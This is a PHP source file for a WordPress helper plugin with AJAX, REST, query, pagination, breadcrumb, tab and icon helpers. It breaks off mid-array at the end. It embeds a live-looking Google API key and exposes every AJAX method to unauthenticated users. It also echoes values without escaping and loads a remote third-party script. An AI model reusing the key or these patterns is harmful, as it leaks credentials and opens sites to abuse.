<?php

/* TODO:
- Inserir opção de limpar caches específicos;
*/

/*if (isset($_GET['wpska_js'])): header('Content-Type: application/javascript'); ?>
<?php die; endif;

else if (isset($_GET['wpska_js'])): header('Content-Type: application/javascript'); ?>
<?php die; endif;*/



if (! function_exists('dd')) {
	function dd() {
		foreach(func_get_args() as $data) {
			echo '<pre style="font:11px monospace; border:solid 1px #ddd; background:#eee; padding:5px;">',
			print_r($data, true), '&nbsp;</pre>';
		}
	}
}




class Wpska_Actions
{
	
	public $replace = array();
	public $level = array();

	public function __construct()
	{
		foreach(get_class_methods($this) as $method) {
			if ($method=='__construct') continue;

			$params = array(
				'action' => $method,
				'level' => array(10, 2),
			);


			if (property_exists($this, $method)) {
				$params = array_merge($params, $this->{$method});
			}

			$params['level'][0] = isset($params['level'][0])? $params['level'][0]: 10;
			$params['level'][1] = isset($params['level'][1])? $params['level'][1]: 2;
			add_action($params['action'], array($this, $method), $params['level'][0], $params['level'][1]);
		}
	}
}


class Wpska_Filters
{
	public function __construct()
	{
		foreach(get_class_methods($this) as $method) {
			if ($method=='__construct') continue;
			add_filter($method, array($this, $method), 10, 2);
		}
	}
}


class Wpska_Ajax
{
	public $error = array();

	public function __construct()
	{
		$ignore = array(
			'__construct', 'error', 'response', 'param',
			'validateEmpty', 'validateEmail',
		);
		foreach(get_class_methods($this) as $method) {
			if (in_array($method, $ignore)) continue;
			add_action("wp_ajax_{$method}", array($this, 'response'));
			add_action("wp_ajax_nopriv_{$method}", array($this, 'response'));
		}
	}


	public function error($error=null)
	{
		if ($error) $this->error[] = $error;
		return empty($this->error)? false: $this->error;
	}


	public function response()
	{
		$call = array($this, $_REQUEST['action']);
		$success = call_user_func($call);
		echo json_encode(array(
			'success' => $success,
			'error' => $this->error(),
		)); wp_die();
	}


	public function param($key, $default=false)
	{
		return isset($_REQUEST[$key])? $_REQUEST[$key]: $default;
	}

	public function validateEmpty($name, $error)
	{
		if (! $this->param($name)) {
			$this->error($error);
		}
	}

	public function validateEmail($name, $error)
	{
		if (! filter_var($this->param($name), FILTER_VALIDATE_EMAIL)) {
			$this->error($error);
		}
	}

	public function wpska_test()
	{
		return array(
			'rand' => rand(),
			'str_shuffle' => str_shuffle('abcdefghijklmnopqrstuvwxyz          '),
			'methods' => get_class_methods($this),
		);
	}
}



class Wpska_Api
{
	public function __construct()
	{
		$me = $this;
		add_action('rest_api_init', function() use($me) {
			foreach(get_class_methods($me) as $method) {
				if ($method=='__construct') continue;
				$params = $me->{$method};
				$params = is_array($params)? $params: array();
				$params = array_merge(array(
					'namespace' => 'wpska/v1',
					'route' => $method,
					'params' => array(
						'methods' => 'GET',
						'callback' => null,
					),
				), $params);
				$params['params']['callback'] = array($me, $method);
				register_rest_route($params['namespace'], $params['route'], $params['params']);
			}
		});
	}
}


class Wpska_Posts
{
	
	static $instance=false;
	static function instance($query, $wpska_query_cache='option')
	{
		if (! self::$instance) {
			self::$instance = new self($query, $wpska_query_cache);
		}
		return self::$instance;
	}


	public function __construct($query, $wpska_query_cache='option')
	{
		if (is_object($query) AND 'WP_Query'==get_class($query)) {
			foreach($query as $key=>$val) {
				$this->{$key} = $val;
			}
			return;
		}

		if (!$query OR is_string($query)) {
			parse_str($query, $query);
		}

		if ($wpska_query_cache=='option') {
			$wpska_query_cache = get_option('wpska_query_cache', 3600);
		}

		$result = array();
		if ($wpska_query_cache>0) {
			$cache_key = sprintf('wpska_query_cache_%s_%s', md5(serialize($query)), $wpska_query_cache);
			$result = get_transient($cache_key);
			if (! $result) {
				$result = new WP_Query($query);
				set_transient($cache_key, $result, $wpska_query_cache);
			}
		}
		else {
			$result = new WP_Query($query);
		}

		foreach($result as $key=>$val) {
			$this->{$key} = $val;
		}
	}



	public function content($callback)
	{
		global $post;
		if (!empty($this->posts) AND is_callable($callback)) {
			foreach($this->posts as $i=>$_post) {
				$post = $_post;
				setup_postdata($_post);
				call_user_func($callback, $post, $i);
			}
			wp_reset_postdata();
		}
		return $this;
	}


	public function loop($callback)
	{
		return $this->content($callback);
	}


	public function notFound($callback)
	{
		if (empty($this->posts) AND is_callable($callback)) {
			call_user_func($callback);
		}
		return $this;
	}


	public function pagination()
	{
		$big = 999999999;
		$pages = paginate_links( array(
				'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
				'format' => '?paged=%#%',
				'current' => max( 1, get_query_var('paged') ),
				'total' => $this->query->max_num_pages,
				'type'  => 'array',
				'prev_next'   => true,
				'prev_text'    => __('«'),
				'next_text'    => __('»'),
			)
		);

		if( is_array( $pages ) ) {
			$paged = ( get_query_var('paged') == 0 ) ? 1 : get_query_var('paged');

			$pagination = '<ul class="pagination">';

			foreach ( $pages as $page ) {
				$pagination .= "<li>$page</li>";
			}

			$pagination .= '</ul>';

			return $pagination;
		}
	}


	public function paginate()
	{
		return $this->pagination();
	}
}




class Wpska_Post
{
	
	public $post=false;
	public function __construct($_post=null)
	{
		global $post;
		$this->post = $post;
		if ($_post) $this->post = $_post;
	}


	public function content($callback)
	{
		global $post;
		if (is_callable($callback)) {
			$post = $this->post;
			setup_postdata($this->post);
			call_user_func($callback, $post);
			wp_reset_postdata();
		}
	}
}



function wpska_header() {
	global $wpska_header_loaded;
	if ($wpska_header_loaded) return null;
	echo '<script src="https://wpska.herokuapp.com/wpska.js"></script>';
	$wpska_header_loaded=true;
}




function wpska_modules($keyname=null) {
	$modules['wpska'] = array('title'=>'Helper');
	$modules['wpska_form'] = array('title'=>'Gerenciador de contatos e newsletters');
	$modules['wpska_menu'] = array('title'=>'Menu customizado');
	$modules['wpska_ui'] = array('title'=>'User interfaces');
	$modules['wpska_email'] = array('title'=>'Gerenciamento e customização de e-mails');
	$modules['wpska_postbox'] = array('title'=>'Gerenciamento de postboxes.');
	$modules['wpska_posttypes'] = array('title'=>'Post types');
	$modules['wpska_theme'] = array('title'=>'Customização de tema.');
	$modules['wpska_maintenance'] = array('title'=>'Manutenção.');

	foreach($modules as $key=>$mod) {
		$mod['id'] = $key;
		$mod['basename'] = "{$key}.php";
		$mod['file'] = __DIR__ . "/{$mod['basename']}";
		$mod['download'] = "https://raw.githubusercontent.com/jeff-silva/wpska/master/{$mod['basename']}";
		$mod['file_exists'] = file_exists($mod['file']);

		$mod['actions'] = array();
		$mod['actions']['update'] = array(
			'icon' => ($mod['file_exists']? 'fa fa-fw fa-refresh': 'fa fa-fw fa-download'),
			'label' => ($mod['file_exists']? 'Atualizar': 'Baixar'),
			'url' => "options-general.php?page=wpska-settings&wpska-update={$mod['id']}",
			'attr' => '',
		);
		$mod['actions']['delete'] = array(
			'icon' => 'fa fa-fw fa-remove',
			'label' => 'Deletar',
			'url' => "options-general.php?page=wpska-settings&wpska-delete={$mod['id']}",
			'attr' => 'onclick="return confirm(\'Tem certeza que deseja deletar?\');"',
		);

		if ($mod['id']=='wpska') { unset($mod['actions']['delete']); }

		$modules[$key] = $mod;
	}

	if ($keyname) {
		return isset($modules[$keyname])? $modules[$keyname]: false;
	}

	return $modules;
}





function wpska_keys($keyname=null) {
	$keys = array(
		'google_key' => 'AIzaSyB-Li2nMHdkyiJVLubSOtxZZEqGkmxRpvs',
	);

	if ($keyname) {
		return isset($keys[$keyname])?
			$keys[$keyname]: false;
	}

	return $keys;
}



function wpska_map($params=null, $attr='style="border:none;"') {
	parse_str($params, $params);
	$params = is_array($params)? $params: array();
	$params['key'] = wpska_keys('google_key');
	$params = http_build_query($params);
	return "<iframe src='https://www.google.com/maps/embed/v1/place?{$params}' {$attr}></iframe>";
}




function wpska_tab($title, $call) {
	global $wpska_tab;
	$wpska_tab = is_array($wpska_tab)? $wpska_tab: array();
	$id = 'tab' . md5($title . rand());
	$wpska_tab[] = array('id'=>$id, 'title'=>$title, 'call'=>$call);
}




function wpska_tab_render($settings=null) {
	global $wp, $wpska_tab;
	$tabs = is_array($wpska_tab)? $wpska_tab: array();
	$wpska_tab=null;

	if (!is_array($settings)) parse_str($settings, $settings);

	$settings = array_merge(array(
		'active' => 0,
		'link' => null,
	), $settings);

	?>
	<?php wpska_header(); ?>

	<?php if ($settings['link']): ?>
	<?php $cdztab = isset($_GET['cdztab'])? $_GET['cdztab']: $tabs[ $settings['active'] ]['id']; ?>
	<ul class="nav nav-tabs" role="tablist">
		<?php foreach($tabs as $i=>$tab): ?>
		<li class="<?php echo $tab['id']==$cdztab? 'active': null; ?>">
			<a href="<?php echo cdz_url("?cdztab={$tab['id']}"); ?>"><?php echo $tab['title']; ?></a>
		</li>
		<?php endforeach; ?>
	</ul>
	<div class="tab-content" style="padding:15px;">
		<?php foreach($tabs as $i=>$tab): if ($cdztab==$tab['id']): ?>
		<?php if (is_callable($tab['call'])) { call_user_func($tab['call']); }
		else echo $tab['call']; ?>
		<?php endif; endforeach; ?>
	</div>


	<?php else: ?>
	<ul class="nav nav-tabs" role="tablist">
		<?php foreach($tabs as $i=>$tab): ?>
		<li role="presentation" class="<?php echo $i==$settings['active']? 'active': null; ?>">
			<a href="#<?php echo $tab['id']; ?>" data-toggle="tab"><?php echo $tab['title']; ?></a>
		</li>
		<?php endforeach; ?>
	</ul>

	<!-- Tab panes -->
	<div class="tab-content" style="padding:15px;">
		<?php foreach($tabs as $i=>$tab): ?>
		<div class="tab-pane <?php echo $i==$settings['active']? 'active': null; ?>" id="<?php echo $tab['id']; ?>">
			<?php if (is_callable($tab['call'])) { call_user_func($tab['call']); }
			else echo $tab['call']; ?>
		</div>
		<?php endforeach; ?>
	</div>
	<?php endif; ?>
	<?php
}



function wpska_link($url) {
	$current = ((isset($_SERVER['HTTPS']) AND $_SERVER['HTTPS']=='on')? 'https': 'http') . "://{$_SERVER['HTTP_HOST']}{$_SERVER['REQUEST_URI']}";
	$current = parse_url($current);
	$current['query'] = isset($current['query'])? $current['query']: '';
	parse_str($current['query'], $current['query']);

	$url = parse_url($url);
	$url['query'] = isset($url['query'])? $url['query']: '';
	parse_str($url['query'], $url['query']);

	$url['query'] = array_merge($current['query'], $url['query']);
	$url['query'] = http_build_query($url['query']);

	$url = array_merge($current, $url);
	$url = "{$url['scheme']}://{$url['host']}{$url['path']}" . ($url['path']? "?{$url['query']}": null);
	return $url;
}




function wpska_pagination($query) {
	$big = 999999999; // need an unlikely integer
	$pages = paginate_links( array(
			'base' => str_replace( $big, '%#%', esc_url( get_pagenum_link( $big ) ) ),
			'format' => '?paged=%#%',
			'current' => max( 1, get_query_var('paged') ),
			'total' => $query->max_num_pages,
			'type'  => 'array',
			'prev_next'   => true,
			'prev_text'    => __('«'),
			'next_text'    => __('»'),
		)
	);

	if( is_array( $pages ) ) {
		$paged = ( get_query_var('paged') == 0 ) ? 1 : get_query_var('paged');

		$pagination = '<ul class="pagination">';

		foreach ( $pages as $page ) {
			$pagination .= "<li>$page</li>";
		}

		$pagination .= '</ul>';

		echo $pagination;
	}
}



function wpska_breadcrumbs($post=null, $callback=null) {
	if (! $post) global $post;

	$callback = is_callable($callback)? $callback: function($breads) { ?>
		<ul class="breadcrumb">
			<?php foreach($breads as $bread): ?>
			<li><a href="<?php echo $bread['url']; ?>"><?php echo $bread['title']; ?></a></li>
			<?php endforeach; ?>
		</ul>
	<?php };

	$breads = array(
		array(
			'title' => 'Home',
			'url' => get_site_url(),
		),
	);

	if (is_category()) {}

	else if (is_search()) {
		$breads[] = array(
			'title' => "Pesquisa</q>",
			'url' => 'javascript:;',
		);
	}

	else if (is_attachment()) {}

	else if (is_page()) {
		if ($post->post_parent) {
			$parent_id  = $post->post_parent;
			$breadcrumbs = array();
			while ($parent_id) {
				$page = get_page($parent_id);
				$breadcrumbs[] = array(
					'title' => get_the_title($page->ID),
					'url' => get_permalink($page->ID),
				);
				$parent_id  = $page->post_parent;
			}
			foreach(array_reverse($breadcrumbs) as $b) {
				$breads[] = $b;
			}
		}
		$breads[] = array(
			'title' => get_the_title(),
			'url' => get_the_permalink(),
		);
	}

	else if (is_404()) {
		$breads[] = array(
			'title' => 'Página não encontrada',
			'url' => '',
		);
	}

	else {
		$type = get_post_type_object($post->post_type);
		$breads[] = array(
			'title' => $type->labels->name,
			'url' => home_url("?s=+&post_type={$type->name}"),
		);

		$breads[] = array(
			'title' => $post->post_title,
			'url' => get_the_permalink($post->ID),
		);
	}

	return call_user_func($callback, $breads);
}





function wpska_thumbnail($post, $default=null) {
	$default = $default? $default: 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAUoAAACqBAMAAAA5NBsAAAAAHlBMVEX///+5ubnKysrT09PFxcXb29v4+Pjm5ubx8fG/v79jhCz7AAACiUlEQVR42u3bS2sTURjG8ZfUmZztkws2u7TCAXcGsXRpRFx3pN52gxa1u4qXxl0UN1mOC/XjGuPMScZDWnKwJ+/Q5/cJ/jxvAiHJCBEREREREREREREREZFe5v3+pm5NJLJ0hAAHEtc3hOhNJSZTIMgviekEYXq5RJQh0JHEkxYI9EPiaf853pNNHQO4KfG0g1ZJi7iVOwCGsrE9oCvrsZKVrFRZ+XaSq680x8D3p8or0xeYGxzprvyKhW6uudJ97BhqrnyFUl9z5TtUpnor0zEqQ72VbTi7eit34PT1Vt6A0xXPa32VHflXup/rqDy9qPIlrI7Kiy6e7qGTq6hswen7UwJWRWUCZ9efEvMxNVSaApVH/pRzVkOlZKic+VMuxtRQeYJSx59ywWqoNO7g/pTlmAoq5UMZM/WmLFkNlebvaAf+lG5MBZXSvg0MDsWb0rEaKiX9+OyT+FOujKmh8tKfBqzOSlMA3phbqrwv68xQZzVWuim9MSNXtvxKf8olq2/LasramOoqZ/BZJRfPa1P6Y6rYMrG1KT1WRWXWyWtT+mMquHgC2NqUHqtgy6xcy03p6Wy/MnFrzbBOvvWLZ9VLz4w1Vda3TNxLbwa9lVn1PjaFqsraxROU7AyqKmtbZij1xnorEyzpqly9eKa2cmXLBE2ozPRWLi+eQG/lcsusCZUJFFe6i2eaK6stEzSh8ovqylYjKpuxZTMqefHrVsmLX7fKZl38zfnlJgvn2/8GRun/L1uNqGzGls2o5MX/nyTogSJTxH/aY3B3E/e28EyKQROe75ERAt2RiE4RZpBLRO0CQX5KVJ/DpjyTqMwIAQ4lMvP44aYePBciIiIiIiIiIiIiIrpyvwGPXU9VynS3IQAAAABJRU5ErkJggg==';
	$thumbnail_url = get_the_post_thumbnail_url($post);
	$thumbnail_url = $thumbnail_url? $thumbnail_url: $default;
	return $thumbnail_url;
}




function wpska_icons($filter_type=null) {
	$icons = array(
		'62259' => 'dashicons-menu', '62233' => 'dashicons-admin-site', '61990' => 'dashicons-dashboard', '61700' => 'dashicons-admin-media', '61701' => 'dashicons-admin-page', '61697' => 'dashicons-admin-comments', '61696' => 'dashicons-admin-appearance', '61702' => 'dashicons-admin-plugins', '61712' => 'dashicons-admin-users', '61703' => 'dashicons-admin-tools', '61704' => 'dashicons-admin-settings', '61714' => 'dashicons-admin-network', '61713' => 'dashicons-admin-generic', '61698' => 'dashicons-admin-home', '61768' => 'dashicons-admin-collapse', '62774' => 'dashicons-filter', '62784' => 'dashicons-admin-customizer', '62785' => 'dashicons-admin-multisite', '61699' => 'dashicons-admin-links', '61705' => 'dashicons-admin-post', '61736' => 'dashicons-format-image', '61793' => 'dashicons-format-gallery', '61735' => 'dashicons-format-audio', '61734' => 'dashicons-format-video', '61733' => 'dashicons-format-chat', '61744' => 'dashicons-format-status', '61731' => 'dashicons-format-aside', '61730' => 'dashicons-format-quote', '61721' => 'dashicons-welcome-write-blog', '61747' => 'dashicons-welcome-add-page', '61717' => 'dashicons-welcome-view-site', '61718' => 'dashicons-welcome-widgets-menus', '61719' => 'dashicons-welcome-comments', '61720' => 'dashicons-welcome-learn-more', '61797' => 'dashicons-image-crop', '62769' => 'dashicons-image-rotate', '61798' => 'dashicons-image-rotate-left', '61799' => 'dashicons-image-rotate-right', '61800' => 'dashicons-image-flip-vertical', '61801' => 'dashicons-image-flip-horizontal', '62771' => 'dashicons-image-filter', '61809' => 'dashicons-undo', '61810' => 'dashicons-redo', '61952' => 'dashicons-editor-bold', '61953' => 'dashicons-editor-italic', '61955' => 'dashicons-editor-ul', '61956' => 'dashicons-editor-ol', '61957' => 'dashicons-editor-quote', '61958' => 'dashicons-editor-alignleft', '61959' => 'dashicons-editor-aligncenter', '61960' => 'dashicons-editor-alignright', '61961' => 'dashicons-editor-insertmore', '61968' => 'dashicons-editor-spellcheck', '61969' => 'dashicons-editor-expand', '62726' => 'dashicons-editor-contract', '61970' => 'dashicons-editor-kitchensink', '61971' => 'dashicons-editor-underline', '61972' => 'dashicons-editor-justify', '61973' => 'dashicons-editor-textcolor', '61974' => 'dashicons-editor-paste-word', '61975' => 'dashicons-editor-paste-text', '61976' => 'dashicons-editor-removeformatting', '61977' => 'dashicons-editor-video', '61984' => 'dashicons-editor-customchar', '61985' => 'dashicons-editor-outdent', '61986' => 'dashicons-editor-indent', '61987' => 'dashicons-editor-help', '61988' => 'dashicons-editor-strikethrough', '61989' => 'dashicons-editor-unlink', '62240' => 'dashicons-editor-rtl', '62580' => 'dashicons-editor-break', '62581' => 'dashicons-editor-code', '62582' => 'dashicons-editor-paragraph', '62773' => 'dashicons-editor-table', '61749' => 'dashicons-align-left', '61750' => 'dashicons-align-right', '61748' => 'dashicons-align-center', '61752' => 'dashicons-align-none', '61792' => 'dashicons-lock', '62760' => 'dashicons-unlock', '61765' => 'dashicons-calendar', '62728' => 'dashicons-calendar-alt', '61815' => 'dashicons-visibility', '62768' => 'dashicons-hidden', '61811' => 'dashicons-post-status', '62564' => 'dashicons-edit', '61826' => 'dashicons-post-trash', '62775' => 'dashicons-sticky', '62724' => 'dashicons-external', '61762' => 'dashicons-arrow-up', '61760' => 'dashicons-arrow-down', '61761' => 'dashicons-arrow-left', '61753' => 'dashicons-arrow-right', '62274' => 'dashicons-arrow-up-alt', '62278' => 'dashicons-arrow-down-alt', '62272' => 'dashicons-arrow-left-alt', '62276' => 'dashicons-arrow-right-alt', '62275' => 'dashicons-arrow-up-alt2', '62279' => 'dashicons-arrow-down-alt2', '62273' => 'dashicons-arrow-left-alt2', '62277' => 'dashicons-arrow-right-alt2', '61993' => 'dashicons-leftright', '61782' => 'dashicons-sort', '62723' => 'dashicons-randomize', '61795' => 'dashicons-list-view', '61796' => 'dashicons-excerpt-view', '62729' => 'dashicons-grid-view', '62789' => 'dashicons-move', '62216' => 'dashicons-hammer', '62217' => 'dashicons-art', '62224' => 'dashicons-migrate', '62225' => 'dashicons-performance', '62595' => 'dashicons-universal-access', '62727' => 'dashicons-universal-access-alt', '62598' => 'dashicons-tickets', '62596' => 'dashicons-nametag', '62593' => 'dashicons-clipboard', '62599' => 'dashicons-heart', '62600' => 'dashicons-megaphone', '62601' => 'dashicons-schedule', '61728' => 'dashicons-wordpress', '62244' => 'dashicons-wordpress-alt', '61783' => 'dashicons-pressthis', '62563' => 'dashicons-update', '61824' => 'dashicons-screenoptions', '61812' => 'dashicons-cart', '61813' => 'dashicons-feedback', '61814' => 'dashicons-cloud', '62246' => 'dashicons-translation', '62243' => 'dashicons-tag', '62232' => 'dashicons-category', '62592' => 'dashicons-archive', '62585' => 'dashicons-tagcloud', '62584' => 'dashicons-text', '62721' => 'dashicons-media-archive', '62720' => 'dashicons-media-audio', '62617' => 'dashicons-media-code', '62616' => 'dashicons-media-default', '62615' => 'dashicons-media-document', '62614' => 'dashicons-media-interactive', '62613' => 'dashicons-media-spreadsheet', '62609' => 'dashicons-media-text', '62608' => 'dashicons-media-video', '62610' => 'dashicons-playlist-audio', '62611' => 'dashicons-playlist-video', '62754' => 'dashicons-controls-play', '62755' => 'dashicons-controls-pause', '62745' => 'dashicons-controls-forward', '62743' => 'dashicons-controls-skipforward', '62744' => 'dashicons-controls-back', '62742' => 'dashicons-controls-skipback', '62741' => 'dashicons-controls-repeat', '62753' => 'dashicons-controls-volumeon', '62752' => 'dashicons-controls-volumeoff', '61767' => 'dashicons-yes', '61784' => 'dashicons-no', '62261' => 'dashicons-no-alt', '61746' => 'dashicons-plus', '62722' => 'dashicons-plus-alt', '62787' => 'dashicons-plus-alt2', '62560' => 'dashicons-minus', '61779' => 'dashicons-dismiss', '61785' => 'dashicons-marker', '61781' => 'dashicons-star-filled', '62553' => 'dashicons-star-half', '61780' => 'dashicons-star-empty', '61991' => 'dashicons-flag', '62280' => 'dashicons-info', '62772' => 'dashicons-warning', '62007' => 'dashicons-share1', '62016' => 'dashicons-share-alt', '62018' => 'dashicons-share-alt2', '62209' => 'dashicons-twitter', '62211' => 'dashicons-rss', '62565' => 'dashicons-email', '62566' => 'dashicons-email-alt', '62212' => 'dashicons-facebook', '62213' => 'dashicons-facebook-alt', '62245' => 'dashicons-networking', '62562' => 'dashicons-googleplus', '62000' => 'dashicons-location', '62001' => 'dashicons-location-alt', '62214' => 'dashicons-camera', '62002' => 'dashicons-images-alt', '62003' => 'dashicons-images-alt2', '62004' => 'dashicons-video-alt', '62005' => 'dashicons-video-alt2', '62006' => 'dashicons-video-alt3', '61816' => 'dashicons-vault', '62258' => 'dashicons-shield', '62260' => 'dashicons-shield-alt', '62568' => 'dashicons-sos', '61817' => 'dashicons-search', '61825' => 'dashicons-slides', '61827' => 'dashicons-analytics', '61828' => 'dashicons-chart-pie', '61829' => 'dashicons-chart-bar', '62008' => 'dashicons-chart-line', '62009' => 'dashicons-chart-area', '62264' => 'dashicons-businessman', '62262' => 'dashicons-id', '62263' => 'dashicons-id-alt', '62226' => 'dashicons-products', '62227' => 'dashicons-awards', '62228' => 'dashicons-forms', '62579' => 'dashicons-testimonial', '62242' => 'dashicons-portfolio', '62256' => 'dashicons-book', '62257' => 'dashicons-book-alt', '62230' => 'dashicons-download', '62231' => 'dashicons-upload', '62241' => 'dashicons-backup', '62569' => 'dashicons-clock', '62265' => 'dashicons-lightbulb', '62594' => 'dashicons-microphone', '62578' => 'dashicons-desktop', '62791' => 'dashicons-laptop', '62577' => 'dashicons-tablet', '62576' => 'dashicons-smartphone', '62757' => 'dashicons-phone', '62248' => 'dashicons-smiley', '62736' => 'dashicons-index-card', '62737' => 'dashicons-carrot', '62738' => 'dashicons-building', '62739' => 'dashicons-store', '62740' => 'dashicons-album', '62759' => 'dashicons-palmtree', '62756' => 'dashicons-tickets-alt', '62758' => 'dashicons-money', '62761' => 'dashicons-thumbs-up', '62786' => 'dashicons-thumbs-down', '62776' => 'dashicons-layout', '62790' => 'dashicons-paperclip', '61709' => 'dashicons-trash', '62550' => 'dashicons-buddicons-groups',
		'f000' => 'fa-glass', 'f001' => 'fa-music', 'f002' => 'fa-search', 'f003' => 'fa-envelope-o', 'f004' => 'fa-heart', 'f005' => 'fa-star', 'f006' => 'fa-star-o', 'f007' => 'fa-user', 'f008' => 'fa-film', 'f009' => 'fa-th-large', 'f00a' => 'fa-th', 'f00b' => 'fa-th-list', 'f00c' => 'fa-check', 'f00d' => 'fa-times', 'f00e' => 'fa-search-plus', 'f010' => 'fa-search-minus', 'f011' => 'fa-power-off', 'f012' => 'fa-signal', 'f013' => 'fa-cog', 'f014' => 'fa-trash-o', 'f015' => 'fa-home', 'f016' => 'fa-file-o', 'f017' => 'fa-clock-o', 'f018' => 'fa-road', 'f019' => 'fa-download', 'f01a' => 'fa-arrow-circle-o-down', 'f01b' => 'fa-arrow-circle-o-up', 'f01c' => 'fa-inbox', 'f01d' => 'fa-play-circle-o', 'f01e' => 'fa-repeat', 'f021' => 'fa-refresh', 'f022' => 'fa-list-alt', 'f023' => 'fa-lock', 'f024' => 'fa-flag', 'f025' => 'fa-headphones', 'f026' => 'fa-volume-off', 'f027' => 'fa-volume-down', 'f028' => 'fa-volume-up', 'f029' => 'fa-qrcode', 'f02a' => 'fa-barcode', 'f02b' => 'fa-tag', 'f02c' => 'fa-tags', 'f02d' => 'fa-book', 'f02e' => 'fa-bookmark', 'f02f' => 'fa-print', 'f030' => 'fa-camera', 'f031' => 'fa-font', 'f032' => 'fa-bold', 'f033' => 'fa-italic', 'f034' => 'fa-text-height', 'f035' => 'fa-text-width', 'f036' => 'fa-align-left', 'f037' => 'fa-align-center', 'f038' => 'fa-align-right', 'f039' => 'fa-align-justify', 'f03a' => 'fa-list', 'f03b' => 'fa-outdent', 'f03c' => 'fa-indent', 'f03d' => 'fa-video-camera', 'f03e' => 'fa-picture-o', 'f040' => 'fa-pencil', 'f041' => 'fa-map-marker', 'f042' => 'fa-adjust', 'f043' => 'fa-tint', 'f044' => 'fa-pencil-square-o', 'f045' => 'fa-share-square-o', 'f046' => 'fa-check-square-o', 'f047' => 'fa-arrows', 'f048' => 'fa-step-backward', 'f049' => 'fa-fast-backward', 'f04a' => 'fa-backward', 'f04b' => 'fa-play', 'f04c' => 'fa-pause', 'f04d' => 'fa-stop', 'f04e' => 'fa-forward', 'f050' => 'fa-fast-forward', 'f051' => 'fa-step-forward', 'f052' => 'fa-eject', 'f053' => 'fa-chevron-left', 'f054' => 'fa-chevron-right', 'f055' => 'fa-plus-circle', 'f056' => 'fa-minus-circle', 'f057' => 'fa-times-circle', 'f058' => 'fa-check-circle', 'f059' => 'fa-question-circle', 'f05a' => 'fa-info-circle', 'f05b' => 'fa-crosshairs', 'f05c' => 'fa-times-circle-o', 'f05d' => 'fa-check-circle-o', 'f05e' => 'fa-ban', 'f060' => 'fa-arrow-left', 'f061' => 'fa-arrow-right', 'f062' => 'fa-arrow-up', 'f063' => 'fa-arrow-down', 'f064' => 'fa-share', 'f065' => 'fa-expand', 'f066' => 'fa-compress', 'f067' => 'fa-plus', 'f068' => 'fa-minus', 'f069' => 'fa-asterisk', 'f06a' => 'fa-exclamation-circle', 'f06b' => 'fa-gift', 'f06c' => 'fa-leaf', 'f06d' => 'fa-fire', 'f06e' => 'fa-eye', 'f070' => 'fa-eye-slash', 'f071' => 'fa-exclamation-triangle', 'f072' => 'fa-plane', 'f073' => 'fa-calendar', 'f074' => 'fa-random', 'f075' => 'fa-comment', 'f076' => 'fa-magnet', 'f077' => 'fa-chevron-up', 'f078' => 'fa-chevron-down', 'f079' => 'fa-retweet', 'f07a' => 'fa-shopping-cart', 'f07b' => 'fa-folder', 'f07c' => 'fa-folder-open', 'f07d' => 'fa-arrows-v', 'f07e' => 'fa-arrows-h', 'f080' => 'fa-bar-chart', 'f081' => 'fa-twitter-square', 'f082' => 'fa-facebook-square', 'f083' => 'fa-camera-retro', 'f084' => 'fa-key', 'f085' => 'fa-cogs', 'f086' => 'fa-comments', 'f087' => 'fa-thumbs-o-up', 'f088' => 'fa-thumbs-o-down', 'f089' => 'fa-star-half', 'f08a' => 'fa-heart-o', 'f08b' => 'fa-sign-out', 'f08c' => 'fa-linkedin-square', 'f08d' => 'fa-thumb-tack', 'f08e' => 'fa-external-link', 'f090' => 'fa-sign-in', 'f091' => 'fa-trophy', 'f092' => 'fa-github-square', 'f093' => 'fa-upload', 'f094' => 'fa-lemon-o', 'f095' => 'fa-phone', 'f096' => 'fa-square-o', 'f097' => 'fa-bookmark-o', 'f098' => 'fa-phone-square', 'f099' => 'fa-twitter', 'f09a' => 'fa-facebook', 'f09b' => 'fa-github', 'f09c' => 'fa-unlock', 'f09d' => 'fa-credit-card', 'f09e' => 'fa-rss', 'f0a0' => 'fa-hdd-o', 'f0a1' => 'fa-bullhorn', 'f0f3' => 'fa-bell', 'f0a3' => 'fa-certificate', 'f0a4' => 'fa-hand-o-right', 'f0a5' => 'fa-hand-o-left', 'f0a6' => 'fa-hand-o-up', 'f0a7' => 'fa-hand-o-down', 'f0a8' => 'fa-arrow-circle-left', 'f0a9' => 'fa-arrow-circle-right', 'f0aa' => 'fa-arrow-circle-up', 'f0ab' => 'fa-arrow-circle-down', 'f0ac' => 'fa-globe', 'f0ad' => 'fa-wrench', 'f0ae' => 'fa-tasks', 'f0b0' => 'fa-filter', 'f0b1' => 'fa-briefcase', 'f0b2' => 'fa-arrows-alt', 'f0c0' => 'fa-users', 'f0c1' => 'fa-link', 'f0c2' => 'fa-cloud', 'f0c3' => 'fa-flask', 'f0c4' => 'fa-scissors', 'f0c5' => 'fa-files-o', 'f0c6' => 'fa-paperclip', 'f0c7' => 'fa-floppy-o', 'f0c8' => 'fa-square', 'f0c9' => 'fa-bars', 'f0ca' => 'fa-list-ul', 'f0cb' => 'fa-list-ol', 'f0cc' => 'fa-strikethrough', 'f0cd' => 'fa-underline', 'f0ce' => 'fa-table', 'f0d0' => 'fa-magic', 'f0d1' => 'fa-truck', 'f0d2' => 'fa-pinterest', 'f0d3' => 'fa-pinterest-square', 'f0d4' => 'fa-google-plus-square', 'f0d5' => 'fa-google-plus', 'f0d6' => 'fa-money', 'f0d7' => 'fa-caret-down', 'f0d8' => 'fa-caret-up', 'f0d9' => 'fa-caret-left', 'f0da' => 'fa-caret-right', 'f0db' => 'fa-columns', 'f0dc' => 'fa-sort', 'f0dd' => 'fa-sort-desc', 'f0de' => 'fa-sort-asc', 'f0e0' => 'fa-envelope', 'f0e1' => 'fa-linkedin', 'f0e2' => 'fa-undo', 'f0e3' => 'fa-gavel', 'f0e4' => 'fa-tachometer', 'f0e5' => 'fa-comment-o', 'f0e6' => 'fa-comments-o', 'f0e7' => 'fa-bolt', 'f0e8' => 'fa-sitemap', 'f0e9' => 'fa-umbrella', 'f0ea' => 'fa-clipboard', 'f0eb' => 'fa-lightbulb-o', 'f0ec' => 'fa-exchange', 'f0ed' => 'fa-cloud-download', 'f0ee' => 'fa-cloud-upload', 'f0f0' => 'fa-user-md', 'f0f1' => 'fa-stethoscope', 'f0f2' => 'fa-suitcase', 'f0a2' => 'fa-bell-o', 'f0f4' => 'fa-coffee', 'f0f5' => 'fa-cutlery', 'f0f6' => 'fa-file-text-o', 'f0f7' => 'fa-building-o', 'f0f8' => 'fa-hospital-o', 'f0f9' => 'fa-ambulance', 'f0fa' => 'fa-medkit', 'f0fb' 